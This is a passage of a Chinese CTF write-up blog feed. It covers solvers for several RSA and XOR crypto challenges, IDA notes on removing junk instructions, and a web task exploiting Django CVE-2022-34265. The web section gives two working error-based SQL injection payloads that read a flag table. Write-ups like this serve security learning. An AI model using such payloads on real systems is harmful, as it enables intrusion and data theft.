32132*x^103 + 34135*x^102 + 43684*x^101 + 837*x^100 + 29311*x^99 + 4849*x^98 + 26632*x^97 + 26662*x^96 + 10159*x^95 + 32657*x^94 + 12149*x^93 + 17858*x^92 + 35805*x^91 + 19391*x^90 + 30884*x^89 + 42039*x^88 + 17292*x^87 + 4694*x^86 + 1497*x^85 + 1744*x^84 + 31071*x^83 + 26246*x^82 + 24402*x^81 + 22068*x^80 + 39263*x^79 + 23703*x^78 + 21484*x^77 + 12241*x^76 + 28821*x^75 + 32886*x^74 + 43075*x^73 + 35741*x^72 + 19936*x^71 + 37219*x^70 + 33411*x^69 + 8301*x^68 + 12949*x^67 + 28611*x^66 + 42654*x^65 + 6910*x^64 + 18523*x^63 + 31144*x^62 + 21398*x^61 + 36298*x^60 + 27158*x^59 + 918*x^58 + 38601*x^57 + 4269*x^56 + 5699*x^55 + 36444*x^54 + 34791*x^53 + 37978*x^52 + 32481*x^51 + 8039*x^50 + 11012*x^49 + 11454*x^48 + 30450*x^47 + 1381*x^46 + 32403*x^45 + 8202*x^44 + 8404*x^43 + 37648*x^42 + 43696*x^41 + 34237*x^40 + 36490*x^39 + 41423*x^38 + 35792*x^37 + 36950*x^36 + 31086*x^35 + 38970*x^34 + 12439*x^33 + 7963*x^32 + 16150*x^31 + 11382*x^30 + 3038*x^29 + 20157*x^28 + 23531*x^27 + 32866*x^26 + 5428*x^25 + 21132*x^24 + 13443*x^23 + 28909*x^22 + 42716*x^21 + 6567*x^20 + 24744*x^19 + 8727*x^18 + 14895*x^17 + 28172*x^16 + 30903*x^15 + 26608*x^14 + 27314*x^13 + 42224*x^12 + 42551*x^11 + 37726*x^10 + 11203*x^9 + 36816*x^8 + 5537*x^7 + 20301*x^6 + 17591*x^5 + 41279*x^4 + 7999*x^3 + 33753*x^2 + 34551*x + 9659</span><br><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br><span class="line"></span><br><span class="line">P, Q = N.factor()</span><br><span class="line">P, Q = P[0], Q[0]</span><br><span class="line">phi = (p ** P.degree() - 1) * (p ** Q.degree() - 1)</span><br><span class="line">e = 0x10001</span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line"></span><br><span class="line">m = pow(c, d, N)</span><br><span class="line">m = "".join([chr(c) for c in m.list()])</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h2><span id="实例">实例</span></h2><h3><span id="buuctf-dasctf-nov-crypto-easyrsa">buuctf dasctf nov crypto easyrsa</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment">#from secrets import flag</span></span><br><span class="line">p1=getPrime(<span class="number">128</span>)</span><br><span class="line">q=getPrime(<span class="number">128</span>)</span><br><span class="line">n=p1**<span class="number">2</span>+q**<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'n='</span>,n)</span><br><span class="line">q=q+<span class="number">63066105847160076051036559850646146794</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        prime = <span class="built_in">sum</span>([random.getrandbits(<span class="number">16</span>) * q**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)])</span><br><span class="line">        <span class="keyword">if</span> isPrime(prime):</span><br><span class="line">            <span class="keyword">return</span> prime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p, q, r = [gen_prime() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">n2=p*q*r</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'n2='</span>,n2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p1=next_prime(p1)</span><br><span class="line">    p=next_prime(p)</span><br><span class="line">    q=next_prime(q)</span><br><span class="line">    r=next_prime(r)</span><br><span class="line">    <span class="keyword">if</span> (p-<span class="number">1</span>)%<span class="number">7</span>==<span class="number">0</span> <span class="keyword">and</span> (q-<span class="number">1</span>)%<span class="number">7</span> ==<span class="number">0</span> <span class="keyword">and</span> (r-<span class="number">1</span>)%<span class="number">7</span>==<span class="number">0</span> <span class="keyword">and</span> (p1-<span class="number">1</span>)%<span class="number">7</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n3=p1**<span class="number">3</span>*p*q*r</span><br><span class="line">e=<span class="number">7</span></span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n3)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'c='</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">n=86073852484226203700520112718689325205597071202320413471730820840719099334770</span></span><br><span class="line"><span class="string">n2= 77582485123791158683121280616703899430016469065264033598472741751344256774648355531493586310864150337351815051848231793841751148287075688226384710343269278032576253497728407800522536152937473072438970839941923618053297480433385258911357458745700958378269978384670108026994918504237309072908971746160378531040480539649223970964653553804442759847964633088481940435582792404175653758785321463055628690804551479982557193366035172983893595403859872458966844805671311011033726279121149599533093604586152158331657286488305064843651636225644328162652701896037366058322959361248649656784810609391313</span></span><br><span class="line"><span class="string">c= 260434870216758498838321584935711394249835963213639852217120194663627852693180232036075839403208332707552953757185774603238436545434522971149891312380970896040823539050341723863717581297624370198483155582245220695123793458717418658539983101802256991837534210806768587736557644192367876024337837658337683388449336720569707094997412847022794461117019613124291022681935875774139147643806772608929174881451749463825639214096129554621195116737322890163556732291246108250543079041977037626755130422879778449546701988814607595746282148723362288451970833214072743929855505520539885650891349827459470540263153862109871050950881032032388185414677989393461533362690744724752363346530211163516319373099647590952338730</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>exp.sage:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env sage</span><br><span class="line"># coding: utf-8</span><br><span class="line"></span><br><span class="line"># In[1]:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = 86073852484226203700520112718689325205597071202320413471730820840719099334770</span><br><span class="line">p, q = two_squares(n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># In[2]:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(p)</span><br><span class="line">print(q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># In[21]:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base = q + 63066105847160076051036559850646146794</span><br><span class="line">n2 = 77582485123791158683121280616703899430016469065264033598472741751344256774648355531493586310864150337351815051848231793841751148287075688226384710343269278032576253497728407800522536152937473072438970839941923618053297480433385258911357458745700958378269978384670108026994918504237309072908971746160378531040480539649223970964653553804442759847964633088481940435582792404175653758785321463055628690804551479982557193366035172983893595403859872458966844805671311011033726279121149599533093604586152158331657286488305064843651636225644328162652701896037366058322959361248649656784810609391313</span><br><span class="line"></span><br><span class="line">poly = sum(e * x^i for i,e in enumerate(Integer(n2).digits(base)))</span><br><span class="line">res = poly.factor_list()</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># In[22]:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">primes = []</span><br><span class="line">for r in res:</span><br><span class="line">    f = r[0]</span><br><span class="line">    primes.append(f(base))</span><br><span class="line">primes</span><br></pre></td></tr></table></figure><p>再求exp.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import random</span><br><span class="line">n = 86073852484226203700520112718689325205597071202320413471730820840719099334770</span><br><span class="line">p, q, r = [65852498339760915228594889597136378107876107334695562152983809050259001488139010835535729480582643283480229654777004862320849604335829446520865511011593811440123502620735962409526109695434570356277,</span><br><span class="line"> 42974281584522050062504679441184925920720278381761957641733614118720547476055402383959476142344396618643274705251619494499668048977089541037606316780609473959806621223833644762635231018066406261919,</span><br><span class="line"> 27414656307685249691067705927388582241684529669740981719565564735302197575673076783872355553268011939023273356472727941960439764826793614011976095106476097211511966378338911454193294048309326195251]</span><br><span class="line">c = 260434870216758498838321584935711394249835963213639852217120194663627852693180232036075839403208332707552953757185774603238436545434522971149891312380970896040823539050341723863717581297624370198483155582245220695123793458717418658539983101802256991837534210806768587736557644192367876024337837658337683388449336720569707094997412847022794461117019613124291022681935875774139147643806772608929174881451749463825639214096129554621195116737322890163556732291246108250543079041977037626755130422879778449546701988814607595746282148723362288451970833214072743929855505520539885650891349827459470540263153862109871050950881032032388185414677989393461533362690744724752363346530211163516319373099647590952338730</span><br><span class="line">n2 = 77582485123791158683121280616703899430016469065264033598472741751344256774648355531493586310864150337351815051848231793841751148287075688226384710343269278032576253497728407800522536152937473072438970839941923618053297480433385258911357458745700958378269978384670108026994918504237309072908971746160378531040480539649223970964653553804442759847964633088481940435582792404175653758785321463055628690804551479982557193366035172983893595403859872458966844805671311011033726279121149599533093604586152158331657286488305064843651636225644328162652701896037366058322959361248649656784810609391313</span><br><span class="line">p1 = 200170033707580057053975766783012322797</span><br><span class="line">assert p * q * r == n2</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    p1=next_prime(p1)</span><br><span class="line">    p=next_prime(p)</span><br><span class="line">    q=next_prime(q)</span><br><span class="line">    r=next_prime(r)</span><br><span class="line">    if (p-1)%7==0 and (q-1)%7 ==0 and (r-1)%7==0 and (p1-1)%7==0:</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">print(f'p1 = %d' %p1)</span><br><span class="line">print(f'p = %d' %p)</span><br><span class="line">print(f'q = %d' %q)</span><br><span class="line">print(f'r = %d' %r)</span><br><span class="line">'''</span><br><span class="line">p1 = 200170033707580057053975766783012328327</span><br><span class="line">p = 65852498339760915228594889597136378107876107334695562152983809050259001488139010835535729480582643283480229654777004862320849604335829446520865511011593811440123502620735962409526109695434570389431</span><br><span class="line">q = 42974281584522050062504679441184925920720278381761957641733614118720547476055402383959476142344396618643274705251619494499668048977089541037606316780609473959806621223833644762635231018066406292679</span><br><span class="line">r = 27414656307685249691067705927388582241684529669740981719565564735302197575673076783872355553268011939023273356472727941960439764826793614011976095106476097211511966378338911454193294048309326229291</span><br><span class="line">'''</span><br></pre></td></tr></table></figure><p>最后sage：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">p1 = 200170033707580057053975766783012328327</span><br><span class="line">p = 65852498339760915228594889597136378107876107334695562152983809050259001488139010835535729480582643283480229654777004862320849604335829446520865511011593811440123502620735962409526109695434570389431</span><br><span class="line">q = 42974281584522050062504679441184925920720278381761957641733614118720547476055402383959476142344396618643274705251619494499668048977089541037606316780609473959806621223833644762635231018066406292679</span><br><span class="line">r = 27414656307685249691067705927388582241684529669740981719565564735302197575673076783872355553268011939023273356472727941960439764826793614011976095106476097211511966378338911454193294048309326229291</span><br><span class="line">n = p1 ** 3 * p * q * r</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">c = 260434870216758498838321584935711394249835963213639852217120194663627852693180232036075839403208332707552953757185774603238436545434522971149891312380970896040823539050341723863717581297624370198483155582245220695123793458717418658539983101802256991837534210806768587736557644192367876024337837658337683388449336720569707094997412847022794461117019613124291022681935875774139147643806772608929174881451749463825639214096129554621195116737322890163556732291246108250543079041977037626755130422879778449546701988814607595746282148723362288451970833214072743929855505520539885650891349827459470540263153862109871050950881032032388185414677989393461533362690744724752363346530211163516319373099647590952338730</span><br><span class="line">PR.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ 7 - c</span><br><span class="line">res = f.roots()</span><br><span class="line">print(res)</span><br><span class="line">for i in res:</span><br><span class="line">    if b'DASCTF' in long_to_bytes(int(i[0])):</span><br><span class="line">        print(long_to_bytes(int(i[0])))</span><br><span class="line"># b'DASCTF{I_d0nt_kn0w_wh@t_i_w@nt_t0_d0_ju3t_d0_it_attack_we@k_prim4!!!}'</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;多项式rsa&quot;&gt;多项式RSA&lt;/span&gt;&lt;/h1&gt;&lt;h2&gt;&lt;span id=&quot;整数rsa加解密原理&quot;&gt;整数RSA加解密原理&lt;/span&gt;&lt;/h2&gt;&lt;p&gt; &lt;img src=&quot;2022-09-02-23-43-40.png&quot; alt&gt;&lt;/p&gt;
&lt;h2&gt;</summary>
      
    
    
    
    <category term="Crypto" scheme="https://feverhu.github.io/categories/Crypto/"/>
    
    
    <category term="RSA" scheme="https://feverhu.github.io/tags/RSA/"/>
    
    <category term="NTURE" scheme="https://feverhu.github.io/tags/NTURE/"/>
    
  </entry>
  
  <entry>
    <title>2022 长城杯政企组 wp</title>
    <link href="https://feverhu.github.io/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/"/>
    <id>https://feverhu.github.io/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/</id>
    <published>2022-08-25T16:05:23.000Z</published>
    <updated>2022-10-29T14:57:01.099Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="2022-长城杯政企组-wp">2022 长城杯政企组 wp</span></h1><p>这次比赛实际并列26名，前15名进入线下复赛，感觉距离线下赛越来越近了。Crypto简单题秒了，因为上班没有抢到前三拿加分，最后这道题第五。然后其余四个小时全部给了re的rabbit_hole，把大致的流程梳理出来了，但是卡在了异常处理，导致最后核心代码没有能够看到并且F5解析。队友做出来web题，赛后看了看misc的办公室爱情，也没用多少时间。如果比赛时候做了说不定就进复赛了？不可能的！没看规则，完全没有记得开录屏。马上打网鼎杯，不要忘了！</p><p>那天打完比赛，Re没做出来实在气不过，于是联系了好多年不联系传奇人物刘大爷，请刘大爷出山给我指点迷津，刘大爷把题秒了，给我讲了两点，立马全都解决了，果然是刘大爷，这个wp大部分功劳是刘大爷的。</p><h2><span id="crypto-xor">Crypto - xor</span></h2><p>task.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cut</span>(<span class="params">obj, sec</span>):</span><br><span class="line">    <span class="keyword">return</span> [obj[i:i+sec] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(obj),sec)]</span><br><span class="line"></span><br><span class="line">x = <span class="number">6</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;flag&#123;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">m = cut(flag, x)</span><br><span class="line"></span><br><span class="line">pad = os.urandom(x)</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    tmp = []</span><br><span class="line"></span><br><span class="line">    tmp.append(i[<span class="number">0</span>] ^ i[<span class="number">1</span>] ^ i[<span class="number">2</span>] ^ pad[<span class="number">0</span>])</span><br><span class="line">    tmp.append(i[<span class="number">3</span>] ^ i[<span class="number">4</span>] ^ pad[<span class="number">1</span>] ^ pad[<span class="number">2</span>])</span><br><span class="line">    tmp.append(pad[<span class="number">5</span>] ^ i[<span class="number">5</span>] ^ pad[<span class="number">1</span>] ^ pad[<span class="number">3</span>])</span><br><span class="line">    tmp.append(i[<span class="number">3</span>] ^ pad[<span class="number">3</span>] ^ pad[<span class="number">4</span>] ^ pad[<span class="number">1</span>])</span><br><span class="line">    tmp.append(i[<span class="number">5</span>] ^ pad[<span class="number">0</span>] ^ i[<span class="number">4</span>] ^ pad[<span class="number">1</span>])</span><br><span class="line">    tmp.append(i[<span class="number">2</span>] ^ i[<span class="number">4</span>] ^ pad[<span class="number">0</span>] ^ pad[<span class="number">1</span>])</span><br><span class="line">    tmp.append(i[<span class="number">2</span>] ^ i[<span class="number">0</span>] ^ i[<span class="number">4</span>] ^ pad[<span class="number">4</span>])</span><br><span class="line">    </span><br><span class="line">    res.append(tmp)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment">#[[150, 194, 49, 195, 23, 79, 66], [194, 136, 63, 147, 3, 2, 81], [132, 221, 57, 144, 83, 83, 93], [208, 223, 37, 193, 28, 0, 70], [154, 203, 108, 156, 28, 78, 68], [159, 221, 62, 146, 86, 82, 88], [197, 141, 117, 192, 31, 90, 85]]</span></span><br></pre></td></tr></table></figure><p>入门题目，“flag{”是flag的前5位，然后是一个7元的方程，求pad6个数和flag{后一位有7个方程正好可以解。用z3即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">##求random，已知前5位是flag&#123;</span><br><span class="line"></span><br><span class="line">i = b&quot;flag&#123;&quot;</span><br><span class="line">so = Solver()</span><br><span class="line"></span><br><span class="line">ans = [150, 194, 49, 195, 23, 79, 66]</span><br><span class="line"></span><br><span class="line">flag5 = BitVec(&#x27;flag5&#x27;,8)</span><br><span class="line">pad = [BitVec(f&#x27;pad&#123;i&#125;&#x27;,8) for i in range(6)]</span><br><span class="line"></span><br><span class="line">so.add(i[0] ^ i[1] ^ i[2] ^ pad[0] == ans[0])</span><br><span class="line">so.add(i[3] ^ i[4] ^ pad[1] ^ pad[2] == ans[1])</span><br><span class="line">so.add(pad[5] ^ flag5 ^ pad[1] ^ pad[3] == ans[2])</span><br><span class="line">so.add(i[3] ^ pad[3] ^ pad[4] ^ pad[1] == ans[3])</span><br><span class="line">so.add(flag5 ^ pad[0] ^ i[4] ^ pad[1] == ans[4])</span><br><span class="line">so.add(i[2] ^ i[4] ^ pad[0] ^ pad[1] == ans[5])</span><br><span class="line">so.add(i[2] ^ i[0] ^ i[4] ^ pad[4] == ans[6])</span><br><span class="line">pad_ = []</span><br><span class="line">if so.check() == sat:</span><br><span class="line">m = so.model()</span><br><span class="line">for k in range(6):</span><br><span class="line">#print(m.eval(pad[k]).as_long())</span><br><span class="line">pad_.append(m.eval(pad[k]).as_long())</span><br><span class="line"></span><br><span class="line">#print(pad_)</span><br><span class="line">#[253, 168, 118, 50, 62, 146]</span><br><span class="line">ans = [[150, 194, 49, 195, 23, 79, 66], [194, 136, 63, 147, 3, 2, 81], [132, 221, 57, 144, 83, 83, 93], [208, 223, 37, 193, 28, 0, 70], [154, 203, 108, 156, 28, 78, 68], [159, 221, 62, 146, 86, 82, 88], [197, 141, 117, 192, 31, 90, 85]]</span><br><span class="line">flag_ = &quot;&quot;</span><br><span class="line">pad = pad_</span><br><span class="line">for i in ans:</span><br><span class="line">so = Solver()</span><br><span class="line">flag = [BitVec(f&#x27;flag&#123;i&#125;&#x27;,8) for i in range(6)]</span><br><span class="line">so.add(flag[0] ^ flag[1] ^ flag[2] ^ pad[0] == i[0])</span><br><span class="line">so.add(flag[3] ^ flag[4] ^ pad[1] ^ pad[2] == i[1])</span><br><span class="line">so.add(pad[5] ^ flag[5] ^ pad[1] ^ pad[3] == i[2])</span><br><span class="line">so.add(flag[3] ^ pad[3] ^ pad[4] ^ pad[1] == i[3])</span><br><span class="line">so.add(flag[5] ^ pad[0] ^ flag[4] ^ pad[1] == i[4])</span><br><span class="line">so.add(flag[2] ^ flag[4] ^ pad[0] ^ pad[1] == i[5])</span><br><span class="line">so.add(flag[2] ^ flag[0] ^ flag[4] ^ pad[4] == i[6])</span><br><span class="line">if so.check() == sat:</span><br><span class="line">m = so.model()</span><br><span class="line">#print(&#x27;&#x27;.join(chr(m[i].as_long()) for i in flag))</span><br><span class="line">flag_ += &#x27;&#x27;.join(chr(m[i].as_long()) for i in flag) </span><br><span class="line">else:</span><br><span class="line">print(&#x27;Error&#x27;)</span><br><span class="line"></span><br><span class="line">print(flag_)</span><br><span class="line">#flag&#123;98167a7e-1471-11ed-a068-da12656dd8d7&#125;</span><br></pre></td></tr></table></figure><h2><span id="web-djangogogo">Web - djangogogo</span></h2><p>这题题解是队友写的。</p><p>CVE-2022-34265 Django Extract &amp; Trunc SQL注入漏洞</p><p>参考资料：http://www.ctfiot.com/47944.html</p><p>由于字符长度限制。用<code>/?name=YEAR FROM sale_datetime)) and updatexml(1,concat(1,(select flag from flag),1),1)--</code>获取前半截flag。</p><figure><img src="1661257426458.png" alt="1661257426458"><figcaption>1661257426458</figcaption></figure><p>用<code>/?name=YEAR FROM sale_datetime)) and updatexml(10,concat((select RIGHT(flag,14) from flag ),1,1,1,1,1,1,1,1),1)--</code>获得后半段flag。</p><figure><img src="1661257431800.png" alt="1661257431800"><figcaption>1661257431800</figcaption></figure><h2><span id="misc-办公室爱情">Misc - 办公室爱情</span></h2><p>有大佬师傅写出来了：https://blog.csdn.net/weixin_44418623/article/details/126493352</p><p>[题目下载][办公室爱情](办公室爱情.zip)</p><h2><span id="reverse-rabbit-hole">Reverse - rabbit hole</span></h2><p>这道题拿到以后运行起来，看起来像很朴素的题目，并且通过Exeinfo，并没有什么壳。</p><figure><img src="1661446868005.png" alt="1661446868005"><figcaption>1661446868005</figcaption></figure><p>然后用ida运行，找到main函数0x004016C0，发现完全不能F5。仔细看有两种画指令。第一种：</p><figure><img src="1661447008186.png" alt="1661447008186"><figcaption>1661447008186</figcaption></figure><p>这种可以直接patch掉EB FF中EB这一位，变成nop(90)，然后在40170A地址上按C转换为code，就可以看到后面的指令了。第二种：</p><figure><img src="1661447155378.png" alt="1661447155378"><figcaption>1661447155378</figcaption></figure><p>这种往上jmp的第一次见。经过尝试可以patch掉4017D5和4017D6两个地址为nop，然后nop掉jmp语句后面的五个地址4017D9到4017DD也nop掉。这种花指令就完成了。</p><figure><img src="1661447330411.png" alt="1661447330411"><figcaption>1661447330411</figcaption></figure><p>经过一顿漫长的操作，找到main函数的retn，从main函数push ebp开始选中到retn，按p，再f5终于可以看出main函数的全貌了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  /*</span><br><span class="line">  有一堆变量定义就不贴了，大家注意变量类型。</span><br><span class="line">  */</span><br><span class="line"></span><br><span class="line">  v31[0] = v3;</span><br><span class="line">  v31[1] = retaddr;</span><br><span class="line">  v4 = alloca(4532);</span><br><span class="line">  atexit(sub_401660);</span><br><span class="line">  sub_401A40();</span><br><span class="line">  gets_s(v29, 0x100u);</span><br><span class="line">  v5 = strlen(v29);</span><br><span class="line">  v6 = BYTE2(v5) ^ (16777619 * (BYTE1(v5) ^ (16777619 * ((unsigned __int8)v5 ^ 0x50C5D1F))));</span><br><span class="line">  v7 = HIBYTE(v5) ^ (16777619 * v6);</span><br><span class="line">  if ( v7 != 1166501587 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v7 == 1563082853 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = 0;</span><br><span class="line">      for ( i = 0; ; i = v9 + 16 )</span><br><span class="line">      &#123;</span><br><span class="line">        v25 = v8;</span><br><span 